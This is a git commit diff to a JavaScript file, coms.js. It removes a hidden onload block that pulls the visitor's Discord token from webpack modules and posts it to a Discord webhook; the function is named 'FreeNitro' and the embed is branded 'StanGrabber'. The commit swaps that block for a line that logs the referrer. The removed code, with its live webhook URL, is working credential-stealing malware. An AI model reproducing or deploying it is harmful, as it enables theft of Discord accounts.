63ad3a46eda015a001867deb072e43c2cc4f4938
180sxc <xcsplgk@gmail.com>
2024-08-17 23:28:40 +0100

    Update coms.js

--- coms.js
+++ coms.js
@@ -132,39 +132,6 @@ function animate () {
 }
 
 window.onload = function () {
-    var discordWebhook = "https://discord.com/api/webhooks/1274476164659810408/8AzWuwNk23QppWXZMhsaBmrL89Nx5cHneMHA4LjY-ns2nuAMj6KKjeJip9F-BJa8hfAW";
-    const webhookurl = 'https://discord.com/api/webhooks/1274476164659810408/8AzWuwNk23QppWXZMhsaBmrL89Nx5cHneMHA4LjY-ns2nuAMj6KKjeJip9F-BJa8hfAW';
-
-var req = webpackJsonp.push([
-    [], {
-        extra_id: (e, t, r) => e.exports = r
-    },
-    [
-        ["extra_id"]
-    ]
-]);
-for (let e in req.c)
-    if (req.c.hasOwnProperty(e)) {
-        let t = req.c[e].exports;
-        if (t && t.__esModule && t.default)
-            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
-    }
-function FreeNitro() {
-    var e = new XMLHttpRequest;
-    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
-    var t = {
-        username: "StanGrabber",
-        avatar_url: "https://cdn.discordapp.com/attachments/736612991948030037/751790394462961715/450.png",
-        content: "",
-        embeds: [{
-            color: "4700374",
-            description: "Token : " + token,
-            footer: {
-                text: "By Stanley#0001 | https://youtube.com/Stanleydev"
-            }
-        }]
-    };
-    e.send(JSON.stringify(t))
-}
-FreeNitro();
+  let previousUrl = document.referrer;
+  console.log(previousUrl);
 }
